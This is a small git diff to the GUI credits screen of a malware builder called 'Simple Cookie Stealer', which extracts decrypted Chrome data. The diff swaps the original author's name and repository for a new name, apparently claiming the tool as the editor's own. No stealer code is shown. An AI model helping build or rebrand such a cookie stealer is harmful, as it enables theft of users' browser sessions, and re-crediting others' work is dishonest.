@@ -118,12 +118,12 @@ class GUI(customtkinter.CTk):
         self.creditText = customtkinter.CTkTextbox(master=self.creditFrame, width=537, height=390, fg_color="#292929")
         self.creditText.insert(END, f"""Simple Cookie Stealer v{version}
 
-Simple Cookie Stealer and Builder are created and brought to you by DeKrypt.
-Offical GitHub Repository: https://github.com/dekrypted/simple-cookie-stealer
+Simple Cookie Stealer and Builder are created and brought to you by Karol.
+Offical GitHub Repository: https://github.com/Karolmn9900/simple-cookie-stealer
 
 Credits:
-DeKrypt - GUI Builder
-DeKrypt - Cookie Stealer Source
+Karol - GUI Builder
+Karol - Cookie Stealer Source
 ThePythonCode - Chrome Decryption (https://www.thepythoncode.com/article/extract-chrome-passwords-python)
 CustomTkinter - Library for GUI (https://customtkinter.tomschimansky.com/)
 PyInstaller - EXE Builder (https://www.pyinstaller.org/)
